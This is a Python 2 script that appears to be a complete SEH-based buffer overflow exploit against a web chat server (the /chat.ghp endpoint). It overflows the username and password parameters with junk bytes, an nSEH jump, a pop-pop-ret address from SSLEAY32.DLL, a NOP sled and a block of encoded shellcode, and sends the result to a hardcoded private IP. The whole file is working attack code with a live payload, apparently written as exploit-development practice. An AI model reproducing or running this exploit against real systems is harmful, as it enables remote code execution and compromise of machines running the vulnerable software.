#!/usr/bin/env python

import socket
import sys

s = None
def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def badchars(ip, port):
	# SEH exploit development formula
	#                    --------------             
	#		     |            |
	#  expolit = junk + nseh + seh + nop + shellcode + padding
	#                    |<-----|
    global s
    junk = 217 * "\x41"  # we have already calculated in previous script
    seh  = "\xE5\x0C\x01\x10"  # pop r32 pop re32 retn in SLLEAY32.DLL 
    #seh  = 4 * "\x42"  # pop r32 pop re32 retn in SLLEAY32.DLL 
    nseh = "\xEB\x0A\x90\x90" # jump ten bytes 2 byte \x90 and 4 byte seh area
    #nseh = 4 * "\x43" # jump ten bytes 2 byte \x90 and 4 byte seh area
    nop  = 16 * "\x90" 
    # bad characthers are \x00 \x20 
    shellcode = ("\xbe\x5f\x51\xd7\x16\xd9\xcb\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x59\x31\x77\x14\x03\x77\x14\x83\xc7\x04\xbd\xa4\x2b\xfe\xce"
"\x47\xd4\xff\xb0\x76\x06\x9b\xbb\x2b\x96\xef\xe9\xc7\x5f\x0a"
"\x86\x8a\x4b\xda\x2f\x60\x52\x6f\x3d\x5d\xab\x90\xf0\x5d\x67"
"\x52\x93\x21\x7a\x87\x73\x1b\xb5\xda\x72\x5c\x03\x90\x9b\x30"
"\xc3\xd1\x31\xa5\x60\xa7\x89\xc4\xa6\xa3\xb1\xbe\xc3\x74\x45"
"\x73\xcd\xa4\x2e\xc3\xd5\xcf\x68\xf4\xe4\x1c\xd8\x71\x2f\xd6"
"\xe4\x30\x81\xe8\x9f\xf7\x6a\x17\x49\xc6\xac\xd9\xba\x24\x81"
"\xdb\x83\x0f\x39\xae\xff\x73\xc4\xa9\xc4\x0e\x12\x3f\xda\xa9"
"\xd1\xe7\x3e\x4b\x35\x71\xb5\x47\xf2\xf5\x91\x4b\x05\xd9\xaa"
"\x70\x8e\xdc\x7c\xf1\xd4\xfa\x58\x59\x8e\x63\xf9\x07\x61\x9b"
"\x19\xef\xde\x39\x52\x02\x08\x3d\x9b\xdc\x35\x63\x0b\x10\xf8"
"\x9c\xcb\x3e\x8b\xef\xf9\xe1\x27\x78\xb1\x6a\xee\x7f\xc0\x7d"
"\x11\xaf\x6a\xed\xef\x50\x8a\x27\x34\x04\xda\x5f\x9d\x25\xb1"
"\x9f\x22\xf0\x2f\xaa\xb4\xf1\xcb\xcc\x50\x6e\x11\x11\x58\xd5"
"\x9c\xf7\x0a\x79\xce\xa7\xea\x29\xae\x17\x83\x23\x21\x47\xb3"
"\x4b\xe8\xe0\x5e\xa4\x44\x58\xf7\x5d\xcd\x12\x66\xa1\xd8\x5e"
"\xa8\x29\xe8\x9f\x67\xda\x99\xb3\x90\xbd\x61\x4c\x61\x28\x61"
"\x26\x65\xfa\x36\xde\x67\xdb\x70\x41\x97\x0e\x03\x86\x67\xcf"
"\x35\xfc\x5e\x45\x79\x6a\x9f\x89\x79\x6a\xc9\xc3\x79\x02\xad"
"\xb7\x2a\x37\xb2\x6d\x5f\xe4\x27\x8e\x09\x58\xef\xe6\xb7\x87"
"\xc7\xa8\x48\xe2\x5b\xae\xb6\x70\x74\x17\xde\x8a\xc4\xa7\x1e"
"\xe1\xc4\xf7\x76\xfe\xeb\xf8\xb6\xff\x21\x51\xde\x8a\xa7\x13"
"\x7f\x8a\xed\xf2\x21\x8b\x02\x2f\xd2\xf6\x6b\xd0\x13\x07\x62"
"\xb5\x14\x07\x8a\xcb\x29\xd1\xb3\xb9\x6c\xe1\x87\xb2\xdb\x44"
"\xa1\x58\x23\xda\xb1\x48")
    padding = (2000 - 225 - 16) * '\x44'
    payload = junk + nseh + seh + nop + shellcode + padding 

    header = "GET /chat.ghp?username=" + payload + "&password="+ payload + "&room=1 HTTP/1.1\r\n"
    header += "HOST:127.0.0.1\r\n"
    header += "\r\n\r\n"

    print "Connecting to target...."
    s.connect((ip, port))
    #s.recv(1024)
    s.send(header)
    print "Disconnecting from target..."
    s.close()


def main():
    connect()
    badchars("10.100.102.16", 80)

main()
    
